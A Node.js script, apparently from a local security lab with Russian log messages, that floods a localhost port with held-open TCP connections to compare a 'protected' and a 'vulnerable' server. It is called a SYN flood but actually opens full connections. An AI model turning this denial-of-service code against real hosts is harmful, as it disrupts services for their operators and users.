const net = require('net');
const log = require('../utils/logger');

class SYNFloodAttacker {
    constructor(targetPort = 8080) {
        this.targetPort = targetPort;
        this.connections = [];
        this.interval = null;
        this.count = 0;
    }

    startAttack(total = 30, delay = 50) {
        const type = this.targetPort === 8080 ? 'ЗАЩИЩЕННЫЙ' : 'УЯЗВИМЫЙ';
        log.section(`SYN FLOOD АТАКА НА ${type} СЕРВЕР`);
        log.attack(`Порт: ${this.targetPort}, попыток: ${total}`);
        
        this.interval = setInterval(() => {
            if (this.count >= total) {
                log.attack(`Создано ${this.connections.length} соединений`);
                return;
            }
            
            const socket = new net.Socket();
            socket.connect(this.targetPort, 'localhost', () => {
                this.connections.push(socket);
                this.count++;
                log.attack(`[${this.count}] СОЕДИНЕНИЕ УСТАНОВЛЕНО (всего активно: ${this.connections.length})`);
                

            });
            
            socket.on('error', (err) => {
                if (err.code === 'ECONNRESET') {
                    log.attack(`СОЕДИНЕНИЕ СБРОШЕНО (ЗАЩИТА)`);
                    const index = this.connections.indexOf(socket);
                    if (index > -1) this.connections.splice(index, 1);
                }
            });
        }, delay);
    }
    
    stopAttack() {
        if (this.interval) clearInterval(this.interval);
        log.attack(`🛑 Закрываю ${this.connections.length} соединений...`);
        this.connections.forEach(s => s.destroy());
        this.connections = [];
        log.attack(`🛑 Атака остановлена`);
    }
}

if (require.main === module) {
    const port = process.argv[2] ? parseInt(process.argv[2]) : 8080;
    const attacker = new SYNFloodAttacker(port);
    attacker.startAttack(30, 50);
    
    process.on('SIGINT', () => {
        attacker.stopAttack();
        process.exit();
    });
}

module.exports = SYNFloodAttacker;